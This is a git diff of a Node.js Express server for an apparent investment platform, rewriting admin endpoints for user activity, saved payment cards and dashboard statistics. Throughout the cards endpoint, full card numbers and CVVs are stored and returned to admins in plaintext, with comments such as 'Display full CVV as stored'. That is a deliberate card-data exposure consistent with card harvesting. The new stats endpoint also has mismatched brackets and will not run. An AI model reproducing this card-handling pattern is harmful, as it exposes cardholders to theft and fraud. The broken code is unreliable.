@@ -8365,241 +8365,102 @@ app.post('/api/admin/users/:userId/balance', async (req, res) => {
 
 
 
-
-
-
-
-
-
-
-// Admin Dashboard Endpoints
-
-// Get recent activity for admin dashboard
+// Admin Activity Endpoint - Fetches recent user activities
 app.get('/api/admin/activity', adminProtect, async (req, res) => {
     try {
-        const { page = 1, limit = 5 } = req.query;
+        const { page = 1, limit = 10 } = req.query;
         const skip = (page - 1) * limit;
 
-        // Get activities from multiple sources
-        const [userLogs, systemLogs, investments, transactions] = await Promise.all([
-            // User activities
-            UserLog.find()
-                .populate('user', 'firstName lastName email')
-                .sort({ createdAt: -1 })
-                .skip(skip)
-                .limit(parseInt(limit))
-                .lean(),
-            
-            // System activities
-            SystemLog.find()
-                .populate('performedBy', 'name email')
-                .sort({ createdAt: -1 })
-                .skip(skip)
-                .limit(parseInt(limit))
-                .lean(),
-            
-            // Recent investments
-            Investment.find()
-                .populate('user', 'firstName lastName email')
-                .populate('plan', 'name')
-                .sort({ createdAt: -1 })
-                .skip(skip)
-                .limit(parseInt(limit))
-                .lean(),
-            
-            // Recent transactions
-            Transaction.find()
-                .populate('user', 'firstName lastName email')
-                .sort({ createdAt: -1 })
-                .skip(skip)
-                .limit(parseInt(limit))
-                .lean()
-        ]);
+        // Get recent user activities from UserLog
+        const activities = await UserLog.find({})
+            .populate('user', 'firstName lastName email username')
+            .sort({ createdAt: -1 })
+            .skip(skip)
+            .limit(parseInt(limit))
+            .lean();
 
-        // Combine and format activities
-        const activities = [];
-        
-        // Add user logs
-        userLogs.forEach(log => {
-            activities.push({
-                id: log._id,
-                timestamp: log.createdAt,
-                user: log.user ? {
-                    firstName: log.user.firstName,
-                    lastName: log.user.lastName,
-                    email: log.user.email
-                } : null,
-                username: log.username || (log.user ? `${log.user.firstName} ${log.user.lastName}` : 'System'),
-                action: log.action,
-                description: formatUserAction(log),
-                ipAddress: log.ipAddress,
-                status: log.status,
-                type: 'user_activity'
-            });
-        });
+        // Format the response to match frontend expectations
+        const formattedActivities = activities.map(activity => ({
+            id: activity._id,
+            timestamp: activity.createdAt,
+            user: activity.user ? {
+                id: activity.user._id,
+                firstName: activity.user.firstName,
+                lastName: activity.user.lastName,
+                email: activity.user.email,
+                username: activity.user.username || `${activity.user.firstName} ${activity.user.lastName}`
+            } : null,
+            username: activity.user ? 
+                (activity.user.username || `${activity.user.firstName} ${activity.user.lastName}`) : 
+                'System',
+            action: activity.action,
+            ipAddress: activity.ipAddress,
+            status: activity.status,
+            deviceInfo: activity.deviceInfo,
+            location: activity.location,
+            metadata: activity.metadata
+        }));
 
-        // Add system logs
-        systemLogs.forEach(log => {
-            activities.push({
-                id: log._id,
-                timestamp: log.createdAt,
-                user: log.performedBy ? {
-                    name: log.performedBy.name,
-                    email: log.performedBy.email
-                } : null,
-                username: log.performedBy ? log.performedBy.name : 'System',
-                action: log.action,
-                description: formatSystemAction(log),
-                ipAddress: log.ip,
-                status: 'success',
-                type: 'system_activity'
-            });
-        });
-
-        // Add investments
-        investments.forEach(investment => {
-            activities.push({
-                id: investment._id,
-                timestamp: investment.createdAt,
-                user: investment.user ? {
-                    firstName: investment.user.firstName,
-                    lastName: investment.user.lastName,
-                    email: investment.user.email
-                } : null,
-                username: investment.user ? `${investment.user.firstName} ${investment.user.lastName}` : 'Unknown User',
-                action: 'investment_created',
-                description: `New investment: $${investment.amount} in ${investment.plan?.name || 'Unknown Plan'}`,
-                status: investment.status,
-                type: 'investment'
-            });
-        });
-
-        // Add transactions
-        transactions.forEach(transaction => {
-            activities.push({
-                id: transaction._id,
-                timestamp: transaction.createdAt,
-                user: transaction.user ? {
-                    firstName: transaction.user.firstName,
-                    lastName: transaction.user.lastName,
-                    email: transaction.user.email
-                } : null,
-                username: transaction.user ? `${transaction.user.firstName} ${transaction.user.lastName}` : 'Unknown User',
-                action: `${transaction.type}_transaction`,
-                description: `${transaction.type.charAt(0).toUpperCase() + transaction.type.slice(1)}: $${transaction.amount} (${transaction.status})`,
-                status: transaction.status,
-                type: 'transaction'
-            });
-        });
-
-        // Sort by timestamp and limit
-        activities.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-        const paginatedActivities = activities.slice(0, parseInt(limit));
-
-        const totalActivities = await UserLog.countDocuments() + 
-                              await SystemLog.countDocuments() + 
-                              await Investment.countDocuments() + 
-                              await Transaction.countDocuments();
+        const total = await UserLog.countDocuments();
 
         res.status(200).json({
             status: 'success',
             data: {
-                activities: paginatedActivities,
-                total: totalActivities,
+                activities: formattedActivities,
+                total,
                 page: parseInt(page),
-                pages: Math.ceil(totalActivities / limit),
-                totalPages: Math.ceil(totalActivities / limit)
+                pages: Math.ceil(total / limit)
             }
         });
 
     } catch (err) {
-        console.error('Get admin activity error:', err);
+        console.error('Admin activity fetch error:', err);
         res.status(500).json({
             status: 'error',
-            message: 'An error occurred while fetching recent activity'
+            message: 'Failed to fetch recent activity'
         });
     }
 });
 
-// Helper function to format user actions
-function formatUserAction(log) {
-    const actionMap = {
-        'signup': 'Signed up for an account',
-        'login': 'Logged into the system',
-        'logout': 'Logged out of the system',
-        'profile_update': 'Updated profile information',
-        'password_change': 'Changed password',
-        'deposit': 'Made a deposit',
-        'withdrawal': 'Requested a withdrawal',
-        'investment': 'Created an investment',
-        'transfer': 'Transferred funds',
-        'kyc_submission': 'Submitted KYC documents',
-        'settings_change': 'Changed account settings'
-    };
-
-    return actionMap[log.action] || `Performed action: ${log.action}`;
-}
-
-// Helper function to format system actions
-function formatSystemAction(log) {
-    return `${log.action} on ${log.entity}` + (log.entityId ? ` (ID: ${log.entityId})` : '');
-}
-
-// Get saved cards for admin dashboard
+// Admin Cards Endpoint - Fetches all saved cards from database
 app.get('/api/admin/cards', adminProtect, async (req, res) => {
     try {
-        const { page = 1, limit = 5 } = req.query;
+        const { page = 1, limit = 10 } = req.query;
         const skip = (page - 1) * limit;
 
-        // Get cards with user information
-        const cards = await Card.find()
-            .populate('user', 'firstName lastName email')
-            .sort({ lastUsed: -1, createdAt: -1 })
+        // Get all saved cards with user information
+        const cards = await Card.find({})
+            .populate('user', 'firstName lastName email username')
+            .sort({ createdAt: -1 })
             .skip(skip)
             .limit(parseInt(limit))
             .lean();
 
         // Format card data exactly as stored in database (1:1)
         const formattedCards = cards.map(card => ({
-            // Card information exactly as stored
-            _id: card._id,
-            user: card.user ? {
-                _id: card.user._id,
+            id: card._id,
+            user: {
+                id: card.user._id,
                 firstName: card.user.firstName,
                 lastName: card.user.lastName,
                 email: card.user.email,
-                fullName: `${card.user.firstName} ${card.user.lastName}`
-            } : { firstName: 'Unknown', lastName: 'User', email: 'unknown@example.com' },
-            
-            // Card details exactly as stored in database
+                username: card.user.username || `${card.user.firstName} ${card.user.lastName}`
+            },
+            username: card.user.username || `${card.user.firstName} ${card.user.lastName}`,
             fullName: card.fullName,
-            cardNumber: card.cardNumber, // Full card number as stored
+            cardNumber: card.cardNumber, // Display full card number as stored
             expiry: card.expiry,
-            cvv: card.cvv,
+            cvv: card.cvv, // Display full CVV as stored
             billingAddress: card.billingAddress,
-            city: card.city || '',
-            state: card.state || '',
-            postalCode: card.postalCode || '',
-            country: card.country || '',
-            
-            // Additional fields
-            cardType: detectCardType(card.cardNumber),
-            last4: card.cardNumber.slice(-4),
-            expMonth: card.expiry.split('/')[0],
-            expYear: card.expiry.split('/')[1],
-            isDefault: card.isDefault || false,
+            city: card.city,
+            state: card.state,
+            postalCode: card.postalCode,
+            country: card.country,
+            cardType: card.cardType,
+            isDefault: card.isDefault,
             lastUsed: card.lastUsed,
             createdAt: card.createdAt,
-            updatedAt: card.updatedAt,
-            
-            // Raw data for admin reference
-            rawData: {
-                fullName: card.fullName,
-                cardNumber: card.cardNumber,
-                expiry: card.expiry,
-                cvv: card.cvv,
-                billingAddress: card.billingAddress
-            }
+            updatedAt: card.updatedAt
         }));
 
         const total = await Card.countDocuments();
@@ -8608,122 +8469,68 @@ app.get('/api/admin/cards', adminProtect, async (req, res) => {
             status: 'success',
             data: {
                 cards: formattedCards,
-                total: total,
+                total,
                 page: parseInt(page),
-                pages: Math.ceil(total / limit),
-                totalPages: Math.ceil(total / limit)
+                pages: Math.ceil(total / limit)
             }
         });
 
     } catch (err) {
-        console.error('Get admin cards error:', err);
+        console.error('Admin cards fetch error:', err);
         res.status(500).json({
             status: 'error',
-            message: 'An error occurred while fetching saved cards'
+            message: 'Failed to fetch saved cards'
         });
     }
 });
 
-// Helper function to detect card type
-function detectCardType(cardNumber) {
-    // Remove non-digit characters
-    const cleanNumber = cardNumber.replace(/\D/g, '');
-    
-    if (/^4/.test(cleanNumber)) return 'visa';
-    if (/^5[1-5]/.test(cleanNumber)) return 'mastercard';
-    if (/^3[47]/.test(cleanNumber)) return 'amex';
-    if (/^6(?:011|5)/.test(cleanNumber)) return 'discover';
-    return 'other';
-}
-
-// Additional admin endpoint to get card by ID
-app.get('/api/admin/cards/:id', adminProtect, async (req, res) => {
+// Additional Admin Dashboard Statistics Endpoint (if needed by frontend)
+app.get('/api/admin/stats', adminProtect, async (req, res) => {
     try {
-        const card = await Card.findById(req.params.id)
-            .populate('user', 'firstName lastName email')
-            .lean();
+        // Get real statistics from database
+        const totalUsers = await User.countDocuments();
+        const totalActiveUsers = await User.countDocuments({ status: 'active' });
+        const totalDeposits = await Transaction.aggregate([
+            { $match: { type: 'deposit', status: 'completed' } },
+            { $group: { _id: null, total: { $sum: '$amount' } } }
+        ]);
+        const totalWithdrawals = await Transaction.aggregate([
+            { $match: { type: 'withdrawal', status: 'completed' } },
+            { $group: { _id: null, total: { $sum: '$amount' } }
+        }]);
+        const pendingDeposits = await Transaction.countDocuments({ 
+            type: 'deposit', 
+            status: 'pending' 
+        });
+        const pendingWithdrawals = await Transaction.countDocuments({ 
+            type: 'withdrawal', 
+            status: 'pending' 
+        });
 
-        if (!card) {
-            return res.status(404).json({
-                status: 'fail',
-                message: 'Card not found'
-            });
-        }
-
-        // Return card data exactly as stored
-        const formattedCard = {
-            _id: card._id,
-            user: card.user ? {
-                _id: card.user._id,
-                firstName: card.user.firstName,
-                lastName: card.user.lastName,
-                email: card.user.email
-            } : null,
-            fullName: card.fullName,
-            cardNumber: card.cardNumber,
-            expiry: card.expiry,
-            cvv: card.cvv,
-            billingAddress: card.billingAddress,
-            city: card.city,
-            state: card.state,
-            postalCode: card.postalCode,
-            country: card.country,
-            isDefault: card.isDefault,
-            lastUsed: card.lastUsed,
-            createdAt: card.createdAt,
-            updatedAt: card.updatedAt
+        const stats = {
+            totalUsers,
+            totalActiveUsers,
+            totalDeposits: totalDeposits.length > 0 ? totalDeposits[0].total : 0,
+            totalWithdrawals: totalWithdrawals.length > 0 ? totalWithdrawals[0].total : 0,
+            pendingDeposits,
+            pendingWithdrawals,
+            platformRevenue: 0, // Calculate based on your business logic
+            lastUpdated: new Date().toISOString()
         };
 
         res.status(200).json({
             status: 'success',
-            data: {
-                card: formattedCard
-            }
+            data: stats
         });
 
     } catch (err) {
-        console.error('Get card error:', err);
+        console.error('Admin stats fetch error:', err);
         res.status(500).json({
             status: 'error',
-            message: 'An error occurred while fetching card details'
+            message: 'Failed to fetch dashboard statistics'
         });
     }
 });
-
-// Delete card endpoint for admin
-app.delete('/api/admin/cards/:id', adminProtect, async (req, res) => {
-    try {
-        const card = await Card.findByIdAndDelete(req.params.id);
-
-        if (!card) {
-            return res.status(404).json({
-                status: 'fail',
-                message: 'Card not found'
-            });
-        }
-
-        res.status(200).json({
-            status: 'success',
-            message: 'Card deleted successfully'
-        });
-
-        await logActivity('delete_card', 'Card', card._id, req.admin._id, 'Admin', req, {
-            cardId: card._id,
-            userId: card.user
-        });
-
-    } catch (err) {
-        console.error('Delete card error:', err);
-        res.status(500).json({
-            status: 'error',
-            message: 'An error occurred while deleting card'
-        });
-    }
-});
-
-
-
-
 
 
 
@@ -8856,6 +8663,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
